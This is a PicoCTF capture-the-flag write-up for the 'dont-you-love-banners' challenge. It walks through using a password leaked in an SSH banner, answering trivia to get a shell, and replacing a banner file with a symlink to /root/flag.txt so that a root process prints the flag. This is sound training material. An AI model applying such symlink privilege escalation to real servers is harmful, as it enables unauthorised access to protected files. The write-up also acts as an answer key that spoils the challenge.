# PicoCTF - dont-you-love-banners

## Challenge Overview
**Title:** dont-you-love-banners  
**Category:** General Skills  
**Difficulty:** Medium  

## Description
Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net 61728. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net 63661. From the above information abuse the machine and find the flag in the /root directory.

## Analysis
We are **provided** with two **links** to which we an `nc` to.

We try the **first** one which **leaks** critical information.
```
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
This gives us the **password** `My_Passw@rd_@1234` which might be **useful** later on.

Trying the **second** link we get
```
*************************************
**************WELCOME****************
*************************************

what is the password? 
```
We **enter** the password `My_Passw@rd_@1234` we found above.  

```
...
what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
```
We are now **prompted** with a **question**.  
The **answer** to this is `DEF CON`.
```
...
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
```
This leads us to a **second** question.
The answer here is `John Draper`
```
...
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```
We have a **shell** now.

We know from the **description** of the challenge that the **flag** is inside `/root`.  
We can verify this by `ls /root`.
```
player@challenge:~$ ls /root
flag.txt  script.py
```
As you can imagine, we can't simply execute `cat /root/flag.txt`.

Inside the **current** directory we have
```
banner  text
```

We know the **challenge** has to do with **banners** from its title.  
The `banner` file has
```
*************************************
**************WELCOME****************
*************************************
```
This is the **same** banner we saw when we **connected** to the server.

My first **idea** was to **replace** the text in `banner` with `$(cat /root/flag/txt)`.  
But the banner is **printed** using `echo` which will **not** execute any **commands**.

Instead of **changing** the text inside `banner`, we have to make `banner` point to `flag.txt`.  
This can be done using a **symbolic link** or **symlink** for short.  
To do this, we will use the `ln` command which **creates** links with the `-s` or `--symbolic` flag
```
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
```
We **verify** the link creation using `ls -l`
```
player@challenge:~$ ls -l
ls -l
total 4
lrwxrwxrwx 1 player player 14 Jun 15 11:54 banner -> /root/flag.txt
-rw-r--r-- 1 root   root   13 Feb  7  2024 text
```
And it is correct, `banner` points to `/root/flag.txt`.

The **final** step is to **reconnect** to the server.
## Solution

- Connect to the **second** server 
- Enter `My_Passw@rd_@1234` when prompted for a **password**
- Enter `DEF CON` for the **first** question
- Enter `John Draper` for the **second** question
- Remove the `banner` using `rm banner`
- Create a **symlink** named `banner` using `ln -s /root/flag.txt banner`
- **Reconnect** to the server

### Execution Example:
```
$ nc tethys.picoctf.net 64800
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEF CON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$ rm banner
rm banner
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
player@challenge:~$ ^C
...
$ nc tethys.picoctf.net 64800
picoCTF{____REDACTED____}

what is the password? 
```